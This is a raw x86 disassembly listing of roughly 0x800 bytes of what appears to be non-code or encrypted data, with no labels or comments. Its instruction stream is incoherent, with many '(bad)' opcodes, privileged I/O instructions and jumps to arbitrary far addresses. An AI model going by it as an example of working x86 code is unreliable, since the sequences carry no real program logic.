  413b60:	or     BYTE PTR [ebx],bl
  413b62:	mov    ds:0x8e78073b,eax
  413b67:	xchg   edx,eax
  413b68:	daa    
  413b69:	mov    ebx,0xde9cd45
  413b6e:	test   al,0x34
  413b70:	adc    al,0x6a
  413b72:	xchg   edi,eax
  413b73:	pop    esp
  413b74:	adc    BYTE PTR [eax-0x3f449425],dh
  413b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b7b:	dec    ebp
  413b7c:	popf   
  413b7d:	mov    BYTE PTR ds:[ecx-0x544a4a28],0x1f
  413b85:	xchg   edi,eax
  413b86:	jge    0x413c03
  413b88:	adc    eax,0x258b4bae
  413b8d:	push   ebx
  413b8e:	les    ebp,FWORD PTR [edi-0x47]
  413b91:	(bad)  
  413b93:	inc    eax
  413b94:	add    al,0x9a
  413b96:	cmp    eax,0xe08213d
  413b9b:	test   BYTE PTR [ebp-0x5d],bl
  413b9e:	mov    al,0xaf
  413ba0:	(bad)  
  413ba1:	sbb    al,0x5d
  413ba3:	lock daa 
  413ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ba6:	retf   0xeab8
  413ba9:	(bad)  
  413baa:	sbb    eax,0x9a957480
  413baf:	inc    edi
  413bb0:	imul   edx,ebp,0xffffffe9
  413bb3:	out    dx,eax
  413bb4:	and    dh,BYTE PTR [edx-0x4c]
  413bb7:	leave  
  413bb8:	pop    ss
  413bb9:	mov    WORD PTR [edx],cs
  413bbb:	mov    bh,0x79
  413bbd:	pop    ss
  413bbe:	bound  esp,QWORD PTR [eax-0x2a]
  413bc1:	cmp    al,cl
  413bc3:	mov    eax,0x6dab6889
  413bc8:	mov    al,ds:0x7eb46e3f
  413bcd:	mov    eax,ds:0xd88805f2
  413bd2:	fld    TBYTE PTR [esi-0x2f]
  413bd5:	das    
  413bd6:	fist   WORD PTR [ecx+0x36dcfbeb]
  413bdc:	adc    BYTE PTR ds:0x8397628f,cl
  413be2:	clc    
  413be3:	mov    edx,ecx
  413be5:	out    dx,eax
  413be6:	fstp   TBYTE PTR [eax]
  413be8:	jb     0x413c37
  413bea:	sub    al,0xfa
  413bec:	jmp    0x1838:0x34a9e9cb
  413bf3:	cwde   
  413bf4:	int    0x27
  413bf6:	pop    edi
  413bf7:	mov    bh,0xd7
  413bf9:	(bad)  
  413bfa:	xchg   DWORD PTR [ecx-0x18],esi
  413bfd:	mov    dh,cl
  413bff:	or     DWORD PTR [ecx],esp
  413c01:	mov    edi,0xe15f7e8f
  413c06:	and    DWORD PTR [esp+esi*1+0x15],edx
  413c0a:	xchg   esi,eax
  413c0b:	shr    BYTE PTR [ebx],cl
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	adc    DWORD PTR [edx-0x7b],0x7f000272
  413c30:	js     0x413c17
  413c32:	jle    0x413cac
  413c34:	js     0x413c05
  413c36:	mov    ecx,0xe2a40ee0
  413c3b:	repnz sbb DWORD PTR [ecx-0x24],edi
  413c3f:	adc    dh,bl
  413c41:	sbb    al,0xaa
  413c43:	mov    edx,DWORD PTR [ebx-0x7e969b06]
  413c49:	fcom   QWORD PTR [edx]
  413c4b:	(bad)  
  413c4c:	lods   al,BYTE PTR ds:[esi]
  413c4d:	fnsetpm(287 only) 
  413c4f:	mov    ebp,0xf9453288
  413c54:	out    0x71,eax
  413c56:	loopne 0x413bde
  413c58:	push   edx
  413c59:	xchg   edi,eax
  413c5a:	outs   dx,DWORD PTR ds:[esi]
  413c5b:	pop    esi
  413c5c:	mov    al,ds:0xb7f22b0
  413c61:	inc    esi
  413c62:	cmp    eax,0xa3348988
  413c67:	sbb    ebx,ebx
  413c69:	lock mov WORD PTR [edx+0x5ab62988],cs
  413c70:	adc    ecx,DWORD PTR [edi-0x2f]
  413c73:	retf   
  413c74:	stos   DWORD PTR es:[edi],eax
  413c75:	adc    BYTE PTR [edx+ebx*8-0x5e0724e2],bl
  413c7c:	jno    0x413c58
  413c7e:	pusha  
  413c7f:	mov    ebx,0xae92d617
  413c84:	and    esp,ebx
  413c86:	xchg   edi,eax
  413c87:	imul   ebx,esi,0xa7b289b5
  413c8d:	mov    al,0xdd
  413c8f:	sahf   
  413c90:	push   0x5ae2325d
  413c95:	cld    
  413c96:	gs xchg edi,eax
  413c98:	(bad)  
  413c99:	ja     0x413c5c
  413c9b:	outs   dx,BYTE PTR ds:[esi]
  413c9c:	mov    eax,0x8ad16ce0
  413ca1:	popf   
  413ca2:	fidivr DWORD PTR [eax+ebx*8-0x5ae3d3ac]
  413ca9:	loop   0x413c3f
  413cab:	cmp    al,0xc4
  413cad:	lods   eax,DWORD PTR ds:[esi]
  413cae:	sub    eax,0x9f26e3d3
  413cb3:	push   ebx
  413cb4:	addr16 test dl,cl
  413cb7:	retf   0xa5e7
  413cba:	xchg   BYTE PTR [eax],dl
  413cbc:	call   0x93ccb21f
  413cc1:	div    DWORD PTR ds:0xa04eb216
  413cc7:	mov    eax,0x11d8ef5c
  413ccc:	test   BYTE PTR [eax],dh
  413cce:	ret    
  413ccf:	sbb    edi,0x45be9605
  413cd5:	rcl    BYTE PTR [edx-0x745e693d],1
  413cdb:	mov    edi,0xdf7f5616
  413ce0:	sbb    DWORD PTR [esi+0x7814b5d],esp
  413ce6:	dec    ecx
  413ce7:	and    eax,0x67e79695
  413cec:	mov    cl,ah
  413cee:	fcomp  DWORD PTR ds:0xac91ab32
  413cf4:	sahf   
  413cf5:	jge    0x413cfa
  413cf7:	sti    
  413cf8:	or     dl,dl
  413cfa:	sbb    DWORD PTR [eax+0x7d],ecx
  413cfd:	fcmove st,st(1)
  413cff:	pop    ds
  413d00:	js     0x413ccd
  413d02:	hlt    
  413d03:	addr16 das 
  413d05:	and    edx,DWORD PTR ds:0xa9fb1c8d
  413d0b:	fadd   DWORD PTR [edi-0x28]
  413d0e:	(bad)  
  413d0f:	(bad)  [edi-0x6934d94a]
  413d15:	dec    ebp
  413d16:	sbb    ch,cl
  413d18:	cdq    
  413d19:	adc    bl,ah
  413d1b:	scas   eax,DWORD PTR es:[edi]
  413d1c:	(bad)  [esi+0x3265d9b5]
  413d22:	add    ebx,DWORD PTR [eax-0x63e95093]
  413d28:	pop    esi
  413d29:	loope  0x413d27
  413d2b:	mov    esi,0x73400253
  413d30:	dec    esp
  413d31:	outs   dx,DWORD PTR ds:[esi]
  413d32:	mov    eax,ds:0x944ec205
  413d37:	add    esp,ecx
  413d39:	aas    
  413d3a:	dec    esi
  413d3b:	lahf   
  413d3c:	aad    0xff
  413d3e:	inc    esi
  413d3f:	sub    BYTE PTR [eax+0x6310206b],bl
  413d45:	call   0xe1207d3e
  413d4a:	das    
  413d4b:	mov    al,0x3a
  413d4e:	add    bh,BYTE PTR [esi]
  413d50:	popa   
  413d51:	(bad)  
  413d52:	fldenv [eax]
  413d54:	mov    ebx,0x87273edc
  413d59:	sub    BYTE PTR [ecx+0x65eb48ce],dh
  413d5f:	dec    esi
  413d60:	mov    al,ds:0x896e8577
  413d65:	lea    esi,[ebp+0x54]
  413d68:	and    bh,BYTE PTR ds:0xdf1eb72c
  413d6e:	mov    eax,DWORD PTR [ebx]
  413d70:	dec    esi
  413d71:	stos   BYTE PTR es:[edi],al
  413d72:	outs   dx,BYTE PTR ds:[esi]
  413d73:	(bad)
  413d76:	loopne 0x413d53
  413d78:	inc    esi
  413d79:	test   BYTE PTR [esi+0x7d],ch
  413d7c:	mov    ch,0x25
  413d7e:	jne    0x413d7c
  413d80:	jbe    0x413d5f
  413d82:	mov    ecx,0xba9ef24b
  413d87:	pushf  
  413d88:	sub    BYTE PTR ss:[eax+edi*8+0x2],ch
  413d8d:	mov    ch,0x92
  413d8f:	jno    0x413deb
  413d91:	pop    ss
  413d92:	or     ah,bl
  413d94:	pop    eax
  413d95:	dec    ebp
  413d96:	(bad)  
  413d98:	cdq    
  413d99:	dec    edi
  413d9a:	sbb    BYTE PTR [eax+ebp*8-0x78],dh
  413d9e:	fimul  WORD PTR [esi]
  413da0:	xchg   BYTE PTR [esi+0x766059dc],ah
  413da6:	mov    ch,0xef
  413da8:	stc    
  413da9:	loopne 0x413db5
  413dab:	(bad)  [ebx]
  413dad:	xchg   esp,eax
  413dae:	inc    ebp
  413daf:	sub    esi,DWORD PTR [ecx]
  413db1:	cmp    dl,al
  413db3:	outs   dx,DWORD PTR ds:[esi]
  413db4:	(bad)  
  413db5:	pop    ebx
  413db6:	and    DWORD PTR [edi],0xffffff86
  413db9:	push   0x9d2445be
  413dbe:	sub    DWORD PTR [ebx+ebp*4],edi
  413dc1:	mov    esp,0x5fe34afc
  413dc6:	add    eax,DWORD PTR [ebp+0x796449b1]
  413dcc:	retf   
  413dcd:	mov    ebx,0xf97a4071
  413dd2:	mov    ebx,0xb38745e
  413dd7:	test   BYTE PTR [ecx],ah
  413dd9:	cmc    
  413dda:	xor    DWORD PTR [edi],esp
  413ddc:	xor    DWORD PTR [edi],ebx
  413dde:	push   0x74
  413de0:	xchg   ebx,eax
  413de1:	retf   0x628a
  413de4:	or     DWORD PTR [edi-0x5b],ebp
  413de7:	mov    ah,0x85
  413de9:	inc    esp
  413dea:	pop    esp
  413deb:	dec    ebp
  413dec:	push   ds
  413ded:	or     al,0x56
  413def:	mov    ss:0x684eb17c,al
  413df5:	je     0x413e4a
  413df7:	sbb    BYTE PTR [ebp-0x2be03fb],dl
  413dfd:	jno    0x413e6c
  413dff:	mov    bl,0x7f
  413e01:	(bad)  
  413e02:	jnp    0x413ddd
  413e04:	repnz enter 0x6f98,0xf5
  413e09:	sub    dl,BYTE PTR gs:[esi+edi*8-0x41499e2d]
  413e11:	xor    ch,BYTE PTR [esi+eiz*4+0x380fb36a]
  413e18:	xchg   edx,eax
  413e19:	repnz outs dx,DWORD PTR ds:[esi]
  413e1b:	add    eax,DWORD PTR [ebp+0x76]
  413e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e1f:	jne    0x413de6
  413e21:	jge    0x413e6d
  413e23:	fdiv   DWORD PTR fs:[ecx-0x72]
  413e27:	push   es
  413e28:	pop    es
  413e29:	lahf   
  413e2a:	and    ebp,DWORD PTR [edi-0x21]
  413e2d:	fsub   QWORD PTR [eax-0x2b751a2b]
  413e33:	cmp    bl,cl
  413e35:	ja     0x413e99
  413e37:	mov    ch,0x67
  413e39:	add    eax,0x5d2dc28a
  413e3e:	cld    
  413e3f:	mov    edx,0x61bce496
  413e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e45:	jecxz  0x413ddf
  413e47:	in     eax,0xea
  413e49:	shl    BYTE PTR [esi],1
  413e4b:	pop    esp
  413e4c:	push   eax
  413e4d:	sub    dh,BYTE PTR [ebx+ecx*4+0x11]
  413e51:	sub    al,BYTE PTR [edx]
  413e53:	mov    cl,0xe1
  413e55:	cmp    cl,BYTE PTR [esi+0x57ce5ea1]
  413e5b:	lock pop es
  413e5d:	stc    
  413e5e:	into   
  413e5f:	mov    eax,ds:0xadf1df37
  413e64:	xchg   DWORD PTR [ebp+0x7efdcab7],esp
  413e6a:	and    al,0x5b
  413e6c:	repz test eax,0x11a6768f
  413e72:	mul    esp
  413e74:	jo     0x413e5d
  413e76:	mov    cl,0x19
  413e78:	das    
  413e79:	add    DWORD PTR [edx+0x1c],esi
  413e7c:	mov    dh,0xd8
  413e7e:	arpl   WORD PTR [edi],dx
  413e80:	retf   0xc690
  413e83:	cmp    ecx,esi
  413e85:	and    bh,BYTE PTR [esi-0xe]
  413e88:	cmp    eax,0x3be3536f
  413e8d:	push   cs
  413e8e:	pop    ecx
  413e8f:	sbb    BYTE PTR [esi+eiz*1],ah
  413e92:	add    ebx,DWORD PTR [ebx+0xd4dc61d]
  413e98:	push   ebp
  413e99:	aaa    
  413e9a:	aam    0x48
  413e9c:	mov    ds:0xfa2612e,eax
  413ea1:	scas   eax,DWORD PTR es:[edi]
  413ea2:	sti    
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	ja     0x413e76
  413eb9:	xchg   edi,eax
  413eba:	cmc    
  413ebb:	out    dx,eax
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	xor    al,0x7e
  413ec5:	je     0x413e87
  413ec7:	data16 fild QWORD PTR [edi+edi*1-0x4b]
  413ecc:	ficom  WORD PTR [edi+esi*4+0x14]
  413ed0:	adc    ecx,edi
  413ed2:	mov    eax,DWORD PTR [eax+0x4d]
  413ed5:	and    DWORD PTR [esi-0x3b983d60],ebp
  413edb:	shl    BYTE PTR [edi+0x14564613],1
  413ee1:	adc    eax,0x56e53a00
  413ee6:	cmp    esp,DWORD PTR [edx+ebx*1+0x56]
  413eea:	hlt    
  413eeb:	cmp    al,BYTE PTR [eax+0x5]
  413eee:	dec    ecx
  413eef:	test   eax,0x34d2fc3c
  413ef4:	iret   
  413ef5:	call   0xd5fe3914
  413efa:	icebp  
  413efb:	mov    al,ds:0x49f6b71c
  413f00:	and    al,0xa5
  413f02:	or     al,bh
  413f04:	sbb    eax,esi
  413f06:	dec    esi
  413f07:	ins    DWORD PTR es:[edi],dx
  413f08:	icebp  
  413f09:	add    DWORD PTR [esi-0x3846c2ed],0xefbad24a
  413f13:	jns    0x413f62
  413f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f16:	sub    al,0xa1
  413f18:	inc    edi
  413f19:	inc    ecx
  413f1a:	sar    esi,cl
  413f1c:	push   es
  413f1d:	sbb    eax,0x14e76534
  413f22:	and    eax,0x69a79b71
  413f27:	lds    ecx,FWORD PTR [ecx]
  413f29:	jne    0x413eb9
  413f2b:	mov    esp,0x4d62305e
  413f30:	mov    dh,0xc7
  413f32:	enter  0xd13,0xee
  413f36:	jmp    0x413fb2
  413f38:	retf   0xd6be
  413f3b:	mov    eax,gs:0x3a486cf7
  413f41:	and    ebx,DWORD PTR [eax]
  413f43:	inc    edi
  413f44:	pushf  
  413f45:	stc    
  413f46:	ds xchg ebx,eax
  413f48:	icebp  
  413f49:	mov    eax,ds:0xb6a89495
  413f4e:	adc    DWORD PTR [ebp+0x6e9e27a8],0x5f789384
  413f58:	mov    ecx,0x8bacafe8
  413f5d:	dec    ecx
  413f5e:	adc    DWORD PTR [esi],esp
  413f60:	jo     0x413f46
  413f62:	lock jl 0x413eeb
  413f65:	shr    BYTE PTR [ecx+0x2c],1
  413f68:	inc    edx
  413f69:	lds    edi,FWORD PTR [ebp+0x4]
  413f6c:	data16 stc 
  413f6e:	test   DWORD PTR [edx+esi*8+0x55b418ac],0xdfb1462f
  413f79:	jp     0x413fea
  413f7b:	cs sub al,0x9
  413f7e:	inc    BYTE PTR [edi+0x11f7420f]
  413f84:	sbb    eax,0xc7211bd8
  413f89:	sub    al,0xdf
  413f8b:	xchg   esp,eax
  413f8c:	cli    
  413f8d:	out    0x89,al
  413f8f:	mov    BYTE PTR [esi-0xa],bh
  413f92:	retf   
  413f93:	sahf   
  413f94:	mov    cl,BYTE PTR [bx+si+0x76b9]
  413f99:	inc    ecx
  413f9a:	pop    eax
  413f9b:	shl    DWORD PTR [ebx-0x3f],1
  413f9e:	xor    al,0x92
  413fa0:	sub    al,0x3f
  413fa2:	mov    ds,ebp
  413fa4:	pusha  
  413fa5:	inc    edx
  413fa6:	es dec ebx
  413fa8:	jle    0x414008
  413faa:	sbb    BYTE PTR [edi-0x36],ah
  413fad:	dec    ecx
  413fae:	ds test eax,0x906d4541
  413fb4:	nop
  413fb5:	xor    DWORD PTR [ecx],edi
  413fb7:	out    0x6c,al
  413fb9:	pop    ecx
  413fba:	push   esi
  413fbb:	push   ebx
  413fbc:	pop    es
  413fbd:	sub    dl,BYTE PTR [edi+eiz*4]
  413fc0:	xchg   esp,eax
  413fc1:	je     0x414039
  413fc3:	jbe    0x413f63
  413fc5:	clc    
  413fc6:	jnp    0x413f89
  413fc8:	inc    edi
  413fc9:	dec    ebp
  413fca:	mov    ebx,0x26caa2ea
  413fcf:	out    dx,eax
  413fd0:	lock push edi
  413fd2:	add    dh,dh
  413fd4:	lods   eax,DWORD PTR ds:[esi]
  413fd5:	pop    ss
  413fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fd7:	jb     0x413fee
  413fd9:	pop    edx
  413fda:	in     eax,dx
  413fdb:	sub    al,0x2e
  413fdd:	xor    eax,0x3f
  413fe0:	fnstsw WORD PTR [edx]
  413fe2:	pop    ecx
  413fe3:	je     0x413f7f
  413fe5:	push   DWORD PTR [edx-0x3d83a1c4]
  413feb:	leave  
  413fec:	iret   
  413fed:	icebp  
  413fee:	mov    ebp,0x8112e862
  413ff3:	pusha  
  413ff4:	dec    esi
  413ff5:	dec    eax
  413ff6:	(bad)  
  413ff7:	mov    esp,0x678e0dc8
  413ffc:	outs   dx,DWORD PTR ds:[esi]
  413ffd:	inc    esp
  413ffe:	aas    
  413fff:	loope  0x413fff
  414001:	icebp  
  414002:	jge    0x414044
  414004:	push   0xeebcfd0
  414009:	push   esi
  41400a:	fld    QWORD PTR [ebx+0x21]
  41400d:	ss mov ecx,0xdf0f4b3a
  414013:	das    
  414014:	xor    DWORD PTR [esi+ecx*4+0x79ded234],eax
  41401b:	xor    eax,edx
  41401d:	retf   0x5ec6
  414020:	push   ss
  414021:	out    dx,eax
  414022:	push   cs
  414023:	aaa    
  414024:	je     0x413fb7
  414026:	(bad)  
  414028:	popf   
  414029:	sub    bh,BYTE PTR [edi+eiz*2]
  41402c:	into   
  41402d:	imul   eax,DWORD PTR [edx-0x11],0x0
  414031:	cmp    eax,0xd2da3ca6
  414036:	inc    ebp
  414037:	sti    
  414038:	jmp    0x414020
  41403a:	xor    eax,0x8b4f2970
  41403f:	leave  
  414040:	dec    ebx
  414041:	push   es
  414042:	sub    BYTE PTR [eax-0x32],bl
  414045:	fst    QWORD PTR [esi+0x47efe3eb]
  41404b:	jnp    0x414072
  41404d:	push   ecx
  41404e:	sbb    dl,0x8b
  414051:	dec    esi
  414052:	or     ecx,eax
  414054:	xchg   esp,eax
  414055:	lock repnz dec ebx
  414058:	sbb    esi,DWORD PTR [eax-0x31a6384f]
  41405e:	cmp    eax,0x8293242b
  414063:	sbb    BYTE PTR [ebp+0x6b42758a],ch
  414069:	jmp    0x9451:0x3d570131
  414070:	es in  al,0xc1
  414073:	xor    al,0x2e
  414075:	jbe    0x414097
  414077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414078:	outs   dx,BYTE PTR ds:[esi]
  414079:	mov    esp,0x16fc896c
  41407e:	push   edi
  41407f:	(bad)  
  414080:	mov    ebx,0x2730972c
  414085:	and    DWORD PTR [eax],ebp
  414087:	add    esi,edi
  414089:	jno    0x4140b0
  41408b:	loope  0x4140a7
  41408d:	out    dx,al
  41408e:	add    cl,bl
  414090:	out    0x5a,al
  414092:	inc    DWORD PTR [edi]
  414094:	inc    eax
  414095:	out    0x14,al
  414097:	pop    ecx
  414098:	pop    es
  414099:	scas   eax,DWORD PTR es:[edi]
  41409a:	mov    eax,0xb7bb2e1d
  41409f:	jp     0x4140a7
  4140a1:	dec    ebx
  4140a2:	mov    eax,ds:0x657d7cad
  4140a7:	push   cs
  4140a8:	es mov ah,0xb7
  4140ab:	xlat   BYTE PTR ds:[ebx]
  4140ac:	stc    
  4140ad:	in     eax,dx
  4140ae:	test   eax,0xb9ece237
  4140b3:	add    al,0x96
  4140b5:	xchg   edx,eax
  4140b6:	push   ss
  4140b7:	out    dx,eax
  4140b8:	adc    eax,DWORD PTR [edx]
  4140ba:	imul   eax,DWORD PTR [edx+eax*4],0xf9f0ab16
  4140c1:	push   0x5793ef8c
  4140c6:	cmp    al,0x8a
  4140c8:	loopne 0x4140f5
  4140ca:	cdq    
  4140cb:	or     al,0xa8
  4140cd:	push   ax
  4140cf:	je     0x414144
  4140d1:	repz pop ebp
  4140d3:	mov    ah,0x3f
  4140d5:	scas   al,BYTE PTR es:[edi]
  4140d6:	jmp    0xa433185d
  4140db:	pop    esp
  4140dc:	mul    DWORD PTR [edi+eiz*2]
  4140df:	sti    
  4140e0:	outs   dx,DWORD PTR cs:[esi]
  4140e2:	jbe    0x4140d4
  4140e4:	dec    ebx
  4140e5:	xor    eax,DWORD PTR [edi+0x68]
  4140e8:	jp     0x414117
  4140ea:	push   ebp
  4140eb:	pop    ss
  4140ec:	nop
  4140ed:	adc    ah,BYTE PTR [ebx]
  4140ef:	jge    0x414168
  4140f1:	pusha  
  4140f2:	div    bl
  4140f4:	fucom  st(1)
  4140f6:	jecxz  0x4140ec
  4140f8:	mulps  xmm1,XMMWORD PTR [edx+0x6e]
  4140fc:	cmp    ch,cl
  4140fe:	enter  0x82cd,0x92
  414102:	mov    ebp,0x7649619f
  414108:	mov    ebp,0x3e95665
  41410d:	dec    edx
  41410e:	xchg   edx,eax
  41410f:	add    cl,0x96
  414112:	in     al,dx
  414113:	cwde   
  414114:	jb     0x41413b
  414116:	inc    eax
  414117:	pop    edx
  414118:	aas    
  414119:	mulps  xmm1,xmm5
  41411c:	out    dx,eax
  41411d:	pop    eax
  41411e:	pop    ebx
  41411f:	test   al,0x53
  414121:	sar    esi,0x2c
  414124:	in     al,dx
  414125:	mov    eax,ds:0x50a97533
  41412a:	loopne 0x414103
  41412c:	cmp    edi,DWORD PTR [ebx+esi*1-0x28]
  414130:	jmp    0x4143b8
  414135:	les    edi,FWORD PTR [edi]
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xb1145a14
  414142:	sub    dl,BYTE PTR [esi+0x52]
  414145:	push   esp
  414146:	add    al,0x7f
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4140f2
  41414e:	daa    
  41414f:	xchg   ecx,eax
  414150:	call   0x47886ac4
  414155:	inc    edx
  414156:	dec    edx
  414157:	or     DWORD PTR [edx-0x2f],esp
  41415a:	test   bh,cl
  41415c:	jg     0x41419b
  41415e:	int3   
  41415f:	mov    bh,0x8a
  414161:	pop    esp
  414162:	loope  0x414187
  414164:	lds    ecx,FWORD PTR [ecx+0x3d]
  414167:	scas   eax,DWORD PTR es:[edi]
  414168:	pop    ebx
  414169:	add    eax,0x7982e116
  41416e:	or     al,0x20
  414170:	imul   ebx,ecx,0x699ef8f2
  414176:	shl    BYTE PTR [ecx-0x4c55d655],cl
  41417c:	fisub  WORD PTR [ecx-0xd06147a]
  414182:	pop    esi
  414183:	or     ecx,esp
  414185:	sbb    eax,0x5ac4d227
  41418a:	pop    ebp
  41418b:	(bad)  
  41418c:	fcom   st(7)
  41418e:	xor    ecx,DWORD PTR [edi-0x1cd89eba]
  414194:	stc    
  414195:	mov    bh,0x7e
  414197:	fwait
  414198:	icebp  
  414199:	xlat   BYTE PTR ds:[ebx]
  41419a:	adc    DWORD PTR ds:0xf76c66c0,edi
  4141a0:	xchg   edi,eax
  4141a1:	aam    0x7a
  4141a3:	repz sbb cl,cl
  4141a6:	test   eax,0x8af55988
  4141ab:	retf   
  4141ac:	outs   dx,DWORD PTR ds:[esi]
  4141ad:	les    ebp,FWORD PTR [esi]
  4141af:	sti    
  4141b0:	ja     0x414194
  4141b2:	sti    
  4141b3:	pusha  
  4141b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141b5:	repnz inc ecx
  4141b7:	es mov bl,0x34
  4141ba:	lock cli 
  4141bc:	pop    gs
  4141be:	js     0x41415d
  4141c0:	inc    esp
  4141c1:	(bad)  
  4141c2:	test   al,0xa8
  4141c4:	mov    ah,0xfc
  4141c6:	daa    
  4141c7:	loopne 0x4141e7
  4141c9:	pushf  
  4141ca:	cwde   
  4141cb:	add    esp,DWORD PTR [edx]
  4141cd:	cmp    BYTE PTR [ecx+ecx*8+0x41],dh
  4141d1:	add    al,0x18
  4141d3:	or     BYTE PTR [ebx+0x5de78402],0xb6
  4141da:	popa   
  4141db:	and    al,0x9f
  4141dd:	mov    esi,DWORD PTR ds:0x6b1ab73e
  4141e3:	shr    DWORD PTR [eax],1
  4141e5:	sub    ecx,DWORD PTR [edx]
  4141e7:	sbb    ebp,DWORD PTR [eax+0x67]
  4141ea:	shl    BYTE PTR [ebx+0x5c],1
  4141ed:	inc    ecx
  4141ee:	pop    ecx
  4141ef:	mov    ds:0xf447962c,al
  4141f4:	pop    esp
  4141f5:	push   cs
  4141f6:	lods   eax,DWORD PTR ds:[esi]
  4141f7:	lods   al,BYTE PTR ds:[esi]
  4141f8:	pusha  
  4141f9:	mov    ch,0xc7
  4141fb:	or     al,0x6a
  4141fd:	jl     0x4141eb
  4141ff:	push   edx
  414200:	push   esp
  414201:	xchg   esp,eax
  414202:	push   es
  414203:	pop    edx
  414204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414205:	fs into 
  414207:	push   ebp
  414208:	int3   
  414209:	outs   dx,DWORD PTR ds:[esi]
  41420a:	dec    edx
  41420b:	push   cs
  41420c:	add    bl,ah
  41420e:	aam    0x7e
  414210:	sub    al,0x10
  414212:	adc    BYTE PTR [esi],dh
  414214:	(bad)  
  414215:	jge    0x4141c5
  414217:	scas   al,BYTE PTR es:[edi]
  414218:	fimul  DWORD PTR [eax+0x6ed5127d]
  41421e:	inc    esp
  41421f:	aam    0xd1
  414221:	mov    ds:0xc9316cc9,al
  414226:	not    ebp
  414228:	push   es
  414229:	call   DWORD PTR [ebp+0x5e1b4c5b]
  41422f:	mov    esi,0x8bc04e11
  414234:	mov    eax,0x147ef12a
  414239:	jb     0x414275
  41423b:	sub    ah,cl
  41423d:	mov    al,0x58
  41423f:	(bad)  
  414241:	call   0x30e0f97c
  414246:	and    DWORD PTR [ebx],ebx
  414248:	pop    es
  414249:	int    0xc5
  41424b:	mov    dh,0x56
  41424d:	(bad)  
  41424e:	(bad)  
  41424f:	repnz in eax,dx
  414251:	dec    eax
  414252:	sar    BYTE PTR [edx],cl
  414254:	sti    
  414255:	aad    0x72
  414257:	and    BYTE PTR [ecx+0x74056288],bh
  41425d:	xchg   esi,eax
  41425e:	sbb    eax,0x443c3f3
  414263:	dec    esp
  414264:	inc    ebx
  414265:	popa   
  414266:	aas    
  414267:	mov    al,0x58
  414269:	in     eax,dx
  41426a:	rcr    DWORD PTR [ebx*2-0x122e00c5],cl
  414271:	sbb    WORD PTR [ebx+0xe],bx
  414275:	nop
  414276:	sub    edi,esi
  414278:	rcr    BYTE PTR ds:0x7838861d,cl
  41427e:	rol    ecx,0xe1
  414281:	imul   ebp,edx,0x68
  414284:	cmc    
  414285:	pop    ebx
  414286:	ss out dx,eax
  414288:	pop    ebx
  414289:	ret    
  41428a:	lds    ecx,FWORD PTR [esi]
  41428c:	nop
  41428d:	and    ecx,DWORD PTR [ebp-0x4a]
  414290:	lods   eax,DWORD PTR ds:[esi]
  414291:	jb     0x414243
  414293:	mov    bl,0x4e
  414295:	fsub   DWORD PTR [ecx+0x2b16d09]
  41429b:	lock jecxz 0x414265
  41429e:	loop   0x4142e4
  4142a0:	add    BYTE PTR [esi],cl
  4142a2:	adc    DWORD PTR [edi+0x14],eax
  4142a5:	ins    DWORD PTR es:[edi],dx
  4142a6:	mov    eax,ds:0x84f25121
  4142ab:	inc    esp
  4142ac:	out    0x23,eax
  4142ae:	mov    bh,0xfe
  4142b0:	push   0xffffff88
  4142b2:	push   esp
  4142b3:	pop    ecx
  4142b4:	adc    esp,ebx
  4142b6:	stc    
  4142b7:	adc    al,0x20
  4142b9:	xor    al,0xa3
  4142bb:	mov    bl,0x69
  4142bd:	pop    esp
  4142be:	add    al,0x2f
  4142c0:	stos   BYTE PTR es:[edi],al
  4142c1:	xchg   ebp,eax
  4142c2:	jbe    0x41427d
  4142c4:	outs   dx,BYTE PTR ds:[esi]
  4142c5:	jns    0x41430e
  4142c7:	sub    ebp,edx
  4142c9:	dec    esi
  4142ca:	and    DWORD PTR [edi+0x61],esp
  4142cd:	out    dx,al
  4142ce:	xchg   edi,eax
  4142cf:	repnz mov eax,ds:0xaaef584d
  4142d5:	popa   
  4142d6:	sub    dl,BYTE PTR [ecx]
  4142d8:	leave  
  4142d9:	mov    ebx,0xb9b95f4b
  4142de:	pop    ebx
  4142df:	add    DWORD PTR [esi-0x27],0xa028d36c
  4142e6:	push   esi
  4142e7:	xchg   ecx,eax
  4142e8:	mov    DWORD PTR [eax+0x24128b23],ecx
  4142ee:	icebp  
  4142ef:	fdivr  st,st(3)
  4142f1:	iret   
  4142f2:	call   0x2977:0x96ee2cee
  4142f9:	or     al,0x82
  4142fb:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4142fd:	pusha  
  4142fe:	outs   dx,BYTE PTR ds:[esi]
  4142ff:	xchg   DWORD PTR [esi+0x2deaadcc],esp
  414305:	add    BYTE PTR ds:[eax-0x66],0x40
  41430a:	bound  edx,QWORD PTR [ecx-0x3c]
  41430d:	fld    QWORD PTR [edi]
  41430f:	inc    edx
  414310:	sbb    al,0x75
  414312:	jo     0x4142f7
  414314:	add    al,BYTE PTR [eax+0x3a]
  414317:	push   esp
  414318:	dec    ah
  41431a:	mov    ds:0xccc0dc3f,eax
